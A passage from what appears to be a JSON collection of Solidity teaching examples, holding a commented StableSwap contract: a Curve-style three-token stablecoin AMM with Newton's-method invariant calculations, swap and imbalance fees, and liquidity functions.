for (uint256 i; i < N; ++i) {\n                // TODO: why old_xs[i] * d1 / d0? why not d1 / N?\n                uint256 idealBalance = (old_xs[i] * d1) / d0;\n                uint256 diff = Math.abs(new_xs[i], idealBalance);\n                new_xs[i] -= (LIQUIDITY_FEE * diff) / FEE_DENOMINATOR;\n            }\n\n            d2 = _getD(new_xs);\n        } else {\n            d2 = d1;\n        }\n\n        // Update balances\n        for (uint256 i; i < N; ++i) {\n            balances[i] += amounts[i];\n        }\n\n        // Shares to mint = (d2 - d0) / d0 * total supply\n        // d1 >= d2 >= d0\n        if (_totalSupply > 0) {\n            shares = ((d2 - d0) * _totalSupply) / d0;\n        } else {\n            shares = d2;\n        }\n        require(shares >= minShares, \"shares < min\");\n        _mint(msg.sender, shares);\n    }\n\n    function removeLiquidity(uint256 shares, uint256[N] calldata minAmountsOut)\n        external\n        returns (uint256[N] memory amountsOut)\n    {\n        uint256 _totalSupply = totalSupply;\n\n        for (uint256 i; i < N; ++i) {\n            uint256 amountOut = (balances[i] * shares) / _totalSupply;\n            require(amountOut >= minAmountsOut[i], \"out < min\");\n\n            balances[i] -= amountOut;\n            amountsOut[i] = amountOut;\n\n            IERC20(tokens[i]).transfer(msg.sender, amountOut);\n        }\n\n        _burn(msg.sender, shares);\n    }\n\n    /**\n     * @notice Calculate amount of token i to receive for shares\n     * @param shares Shares to burn\n     * @param i Index of token to withdraw\n     * @return dy Amount of token i to receive\n     *         fee Fee for withdraw. Fee already included in dy\n     */\n    function _calcWithdrawOneToken(uint256 shares, uint256 i)\n        private\n        view\n        returns (uint256 dy, uint256 fee)\n    {\n        uint256 _totalSupply = totalSupply;\n        uint256[N] memory xp = _xp();\n\n        // Calculate d0 and d1\n        uint256 d0 = _getD(xp);\n        uint256 d1 = d0 - (d0 * shares) / _totalSupply;\n\n        // Calculate reduction in y if D = d1\n        uint256 y0 = _getYD(i, xp, d1);\n        // d1 <= d0 so y must be <= xp[i]\n        uint256 dy0 = (xp[i] - y0) / multipliers[i];\n\n        // Calculate imbalance fee, update xp with fees\n        uint256 dx;\n        for (uint256 j; j < N; ++j) {\n            if (j == i) {\n                dx = (xp[j] * d1) / d0 - y0;\n            } else {\n                // d1 / d0 <= 1\n                dx = xp[j] - (xp[j] * d1) / d0;\n            }\n            xp[j] -= (LIQUIDITY_FEE * dx) / FEE_DENOMINATOR;\n        }\n\n        // Recalculate y with xp including imbalance fees\n        uint256 y1 = _getYD(i, xp, d1);\n        // - 1 to round down\n        dy = (xp[i] - y1 - 1) / multipliers[i];\n        fee = dy0 - dy;\n    }\n\n    function calcWithdrawOneToken(uint256 shares, uint256 i)\n        external\n        view\n        returns (uint256 dy, uint256 fee)\n    {\n        return _calcWithdrawOneToken(shares, i);\n    }\n\n    /**\n     * @notice Withdraw liquidity in token i\n     * @param shares Shares to burn\n     * @param i Token to withdraw\n     * @param minAmountOut Minimum amount of token i that must be withdrawn\n     */\n    function removeLiquidityOneToken(\n        uint256 shares,\n        uint256 i,\n        uint256 minAmountOut\n    ) external returns (uint256 amountOut) {\n        (amountOut,) = _calcWithdrawOneToken(shares, i);\n        require(amountOut >= minAmountOut, \"out < min\");\n\n        balances[i] -= amountOut;\n        _burn(msg.sender, shares);\n\n        IERC20(tokens[i]).transfer(msg.sender, amountOut);\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "StableSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nInvariant - price of trade and amount of liquidity are determined by this equation\n\nAn^n sum(x_i) + D = ADn^n + D^(n + 1) / (n^n prod(x_i))\n\nTopics\n0. Newton's method x_(n + 1) = x_n - f(x_n) / f'(x_n)\n1. Invariant\n2. Swap\n   - Calculate Y\n   - Calculate D\n3. Get virtual price\n4. Add liquidity\n   - Imbalance fee\n5. Remove liquidity\n6. Remove liquidity one token\n   - Calculate withdraw one token\n   - getYD\nTODO: test?\n*/\n\nlibrary Math {\n    function abs(uint256 x, uint256 y) internal pure returns (uint256) {\n        return x >= y ? x - y : y - x;\n    }\n}\n\ncontract StableSwap {\n    // Number of tokens\n    uint256 private constant N = 3;\n    // Amplification coefficient multiplied by N^(N - 1)\n    // Higher value makes the curve more flat\n    // Lower value makes the curve more like constant product AMM\n    uint256 private constant A = 1000 * (N ** (N - 1));\n    // 0.03%\n    uint256 private constant SWAP_FEE = 300;\n    // Liquidity fee is derived from 2 constraints\n    // 1. Fee is 0 for adding / removing liquidity that results in a balanced pool\n    // 2. Swapping in a balanced pool is like adding and then removing liquidity\n    //    from a balanced pool\n    // swap fee = add liquidity fee + remove liquidity fee\n    uint256 private constant LIQUIDITY_FEE = (SWAP_FEE * N) / (4 * (N - 1));\n    uint256 private constant FEE_DENOMINATOR = 1e6;\n\n    address[N] public tokens;\n    // Normalize each token to 18 decimals\n    // Example - DAI (18 decimals), USDC (6 decimals), USDT (6 decimals)\n    uint256[N] private multipliers = [1, 1e12, 1e12];\n    uint256[N] public balances;\n\n    // 1 share = 1e18, 18 decimals\n    uint256 private constant DECIMALS = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address[N] memory _tokens) {\n        tokens = _tokens;\n    }\n\n    function _mint(address _to, uint256 _amount) private {\n        balanceOf[_to] += _amount;\n        totalSupply += _amount;\n    }\n\n    function _burn(address _from, uint256 _amount) private {\n        balanceOf[_from] -= _amount;\n        totalSupply -= _amount;\n    }\n\n    // Return precision-adjusted balances, adjusted to 18 decimals\n    function _xp() private view returns (uint256[N] memory xp) {\n        for (uint256 i; i < N; ++i) {\n            xp[i] = balances[i] * multipliers[i];\n        }\n    }\n\n    /**\n     * @notice Calculate D, sum of balances in a perfectly balanced pool\n     * If balances of x_0, x_1, ... x_(n-1) then sum(x_i) = D\n     * @param xp Precision-adjusted balances\n     * @return D\n     */\n    function _getD(uint256[N] memory xp) private pure returns (uint256) {\n        /*\n        Newton's method to compute D\n        -----------------------------\n        f(D) = ADn^n + D^(n + 1) / (n^n prod(x_i)) - An^n sum(x_i) - D \n        f'(D) = An^n + (n + 1) D^n / (n^n prod(x_i)) - 1\n\n                     (as + np)D_n\n        D_(n+1) = -----------------------\n                  (a - 1)D_n + (n + 1)p\n\n        a = An^n\n        s = sum(x_i)\n        p = (D_n)^(n + 1) / (n^n prod(x_i))\n        */\n        uint256 a = A * N; // An^n\n\n        uint256 s; // x_0 + x_1 + ... + x_(n-1)\n        for (uint256 i; i < N; ++i) {\n            s += xp[i];\n        }\n\n        // Newton's method\n        // Initial guess, d <= s\n        uint256 d = s;\n        uint256 d_prev;\n        for (uint256 i; i < 255; ++i) {\n            // p = D^(n + 1) / (n^n * x_0 * ... * x_(n-1))\n            uint256 p = d;\n            for (uint256 j; j < N; ++j) {\n                p = (p * d) / (N * xp[j]);\n            }\n            d_prev = d;\n            d = ((a * s + N * p) * d) / ((a - 1) * d + (N + 1) * p);\n\n            if (Math.abs(d, d_prev) <= 1) {\n                return d;\n            }\n        }\n        revert(\"D didn't converge\");\n    }\n\n    /**\n     * @notice Calculate the new balance of token j given the new balance of token i\n     * @param i Index of token in\n     * @param j Index of token out\n     * @param x New balance of token i\n     * @param xp Current precision-adjusted balances\n     */\n    function _getY(uint256 i, uint256 j, uint256 x, uint256[N] memory xp)\n        private\n        pure\n        returns (uint256)\n    {\n        /*\n        Newton's method to compute y\n        -----------------------------\n        y = x_j\n\n        f(y) = y^2 + y(b - D) - c\n\n                    y_n^2 + c\n        y_(n+1) = --------------\n                   2y_n + b - D\n\n        where\n        s = sum(x_k), k != j\n        p = prod(x_k), k != j\n        b = s + D / (An^n)\n        c = D^(n + 1) / (n^n * p * An^n)\n        */\n        uint256 a = A * N;\n        uint256 d = _getD(xp);\n        uint256 s;\n        uint256 c = d;\n\n        uint256 _x;\n        for (uint256 k; k < N; ++k) {\n            if (k == i) {\n                _x = x;\n            } else if (k == j) {\n                continue;\n            } else {\n                _x = xp[k];\n            }\n\n            s += _x;\n            c = (c * d) / (N * _x);\n        }\n        c = (c * d) / (N * a);\n        uint256 b = s + d / a;\n\n        // Newton's method\n        uint256 y_prev;\n        // Initial guess, y <= d\n        uint256 y = d;\n        for (uint256 _i; _i < 255; ++_i) {\n            y_prev = y;\n            y = (y * y + c) / (2 * y + b - d);\n            if (Math.abs(y, y_prev) <= 1) {\n                return y;\n            }\n        }\n        revert(\"y didn't converge\");\n    }\n\n    /**\n     * @notice Calculate the new balance of token i given precision-adjusted\n     * balances xp and liquidity d\n     * @dev Equation is calculate y is same as _getY\n     * @param i Index of token to calculate the new balance\n     * @param xp Precision-adjusted balances\n     * @param d Liquidity d\n     * @return New balance of token i\n     */\n    function _getYD(uint256 i, uint256[N] memory xp, uint256 d)\n        private\n        pure\n        returns (uint256)\n    {\n        uint256 a = A * N;\n        uint256 s;\n        uint256 c = d;\n\n        uint256 _x;\n        for (uint256 k; k < N; ++k) {\n            if (k != i) {\n                _x = xp[k];\n            } else {\n                continue;\n            }\n\n            s += _x;\n            c = (c * d) / (N * _x);\n        }\n        c = (c * d) / (N * a);\n        uint256 b = s + d / a;\n\n        // Newton's method\n        uint256 y_prev;\n        // Initial guess, y <= d\n        uint256 y = d;\n        for (uint256 _i; _i < 255; ++_i) {\n            y_prev = y;\n            y = (y * y + c) / (2 * y + b - d);\n            if (Math.abs(y, y_prev) <= 1) {\n                return y;\n            }\n        }\n        revert(\"y didn't converge\");\n    }\n\n    // Estimate value of 1 share\n    // How many tokens is one share worth?\n    function getVirtualPrice() external view returns (uint256) {\n        uint256 d = _getD(_xp());\n        uint256 _totalSupply = totalSupply;\n        if (_totalSupply > 0) {\n            return (d * 10 ** DECIMALS) / _totalSupply;\n        }\n        return 0;\n    }\n\n    /**\n     * @notice Swap dx amount of token i for token j\n     * @param i Index of token in\n     * @param j Index of token out\n     * @param dx Token in amount\n     * @param minDy Minimum token out\n     */\n    function swap(uint256 i, uint256 j, uint256 dx, uint256 minDy)\n        external\n        returns (uint256 dy)\n    {\n        require(i != j, \"i = j\");\n\n        IERC20(tokens[i]).transferFrom(msg.sender, address(this), dx);\n\n        // Calculate dy\n        uint256[N] memory xp = _xp();\n        uint256 x = xp[i] + dx * multipliers[i];\n\n        uint256 y0 = xp[j];\n        uint256 y1 = _getY(i, j, x, xp);\n        // y0 must be >= y1, since x has increased\n        // -1 to round down\n        dy = (y0 - y1 - 1) / multipliers[j];\n\n        // Subtract fee from dy\n        uint256 fee = (dy * SWAP_FEE) / FEE_DENOMINATOR;\n        dy -= fee;\n        require(dy >= minDy, \"dy < min\");\n\n        balances[i] += dx;\n        balances[j] -= dy;\n\n        IERC20(tokens[j]).transfer(msg.sender, dy);\n    }\n\n    function addLiquidity(uint256[N] calldata amounts, uint256 minShares)\n        external\n        returns (uint256 shares)\n    {\n        // calculate current liquidity d0\n        uint256 _totalSupply = totalSupply;\n        uint256 d0;\n        uint256[N] memory old_xs = _xp();\n        if (_totalSupply > 0) {\n            d0 = _getD(old_xs);\n        }\n\n        // Transfer tokens in\n        uint256[N] memory new_xs;\n        for (uint256 i; i < N; ++i) {\n            uint256 amount = amounts[i];\n            if (amount > 0) {\n                IERC20(tokens[i]).transferFrom(\n                    msg.sender, address(this), amount\n                );\n                new_xs[i] = old_xs[i] + amount * multipliers[i];\n            } else {\n                new_xs[i] = old_xs[i];\n            }\n        }\n\n        // Calculate new liquidity d1\n        uint256 d1 = _getD(new_xs);\n        require(d1 > d0, \"liquidity didn't increase\");\n\n        // Recalculate D accounting for fee on imbalance\n        uint256 d2;\n        if (_totalSupply > 0) {\n            for (uint256 i; i < N; ++i) {\n                // TODO: why old_xs[i] * d1 / d0? why not d1 / N?\n                uint256 idealBalance = (old_xs[i] * d1) / d0;\n                uint256 diff = Math.abs(new_xs[i], idealBalance);\n                new_xs[i] -= (LIQUIDITY_FEE * diff) / FEE_DENOMINATOR;\n            }\n\n            d2 = _getD(new_xs);\n        } else {\n            d2 = d1;\n        }\n\n        // Update balances\n        for (uint256 i; i < N; ++i) {\n            balances[i] += amounts[i];\n        }\n\n        // Shares to mint = (d2 - d0) / d0 * total supply\n        // d1 >= d2 >= d0\n        if (_totalSupply > 0) {\n            shares = ((d2 - d0) * _totalSupply) / d0;\n        } else {\n            shares = d2;\n        }\n        require(shares >= minShares, \"shares < min\");\n        _mint(msg.sender, shares);\n    }\n\n    function removeLiquidity(uint256 shares, uint256[N] calldata minAmountsOut)\n        external\n        returns (uint256[N] memory amountsOut)\n    {\n        uint256 _totalSupply = totalSupply;\n\n        for (uint256 i; i < N; ++i) {\n            uint256 amountOut = (balances[i] * shares) / _totalSupply;\n            require(amountOut >= minAmountsOut[i], \"out < min\");\n\n            balances[i] -= amountOut;\n            amountsOut[i] = amountOut;\n\n            IERC20(tokens[i]).transfer(msg.sender, amountOut);\n        }\n\n        _burn(msg.sender, shares);\n    }\n\n    /**\n     * @notice Calculate amount of token i to receive for shares\n     * @param shares Shares to burn\n     * @param i Index of token to withdraw\n     * @return dy Amount of token i to receive\n     *         fee Fee for withdraw. Fee already included in dy\n     */\n    function _calcWithdrawOneToken(uint256 shares, uint256 i)\n        private\n        view\n        returns (uint256 dy, uint256 fee)\n    {\n        uint256 _totalSupply = totalSupply;\n        uint256[N] memory xp = _xp();\n\n        // Calculate d0 and d1\n        uint256 d0 = _getD(xp);\n        uint256 d1 = d0 - (d0 * shares) / _totalSupply;\n\n        // Calculate reduction in y if D = d1\n        uint256 y0 = _getYD(i, xp, d1);\n        // d1 <= d0 so y must be <= xp[i]\n        uint256 dy0 = (xp[i] - y0) / multipliers[i];\n\n        // Calculate imbalance fee, update xp with fees\n        uint256 dx;\n        for (uint256 j; j < N; ++j) {\n            if (j == i) {\n                dx = (xp[j] * d1) / d0 - y0;\n            } else {\n                // d1 / d0 <= 1\n                dx = xp[j] - (xp[j] * d1) / d0;\n            }\n            xp[j] -= (LIQUIDITY_FEE * dx) / FEE_DENOMINATOR;\n        }\n\n        // Recalculate y with xp including imbalance fees\n        uint256 y1 = _getYD(i, xp, d1);\n        // - 1 to round down\n        dy = (xp[i] - y1 - 1) / multipliers[i];\n        fee = dy0 - dy;\n    }\n\n    function calcWithdrawOneToken(uint256 shares, uint256 i)\n        external\n        view\n        returns (uint256 dy, uint256 fee)\n    {\n        return _calcWithdrawOneToken(shares, i);\n    }\n\n    /**\n     * @notice Withdraw liquidity in token i\n     * @param shares Shares to burn\n     * @param i Token to withdraw\n     * @param minAmountOut Minimum amount of token i that must be withdrawn\n     */\n    function removeLiquidityOneToken(\n        uint256 shares,\n        uint256 i,\n        uint256 minAmountOut\n    ) external returns (uint256 amountOut) {\n        (amountOut,) = _calcWithdrawOneToken(shares, i);\n        require(amountOut >= minAmountOut, \"out < min\");\n\n        balances[i] -= amountOut;\n        _burn(msg.sender, shares);\n\n        IERC20(tokens[i]).transfer(msg.sender, amountOut);\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "curve",
      "stable",
      "swap",
      "amm"
    ],
    "order": 20
  }
]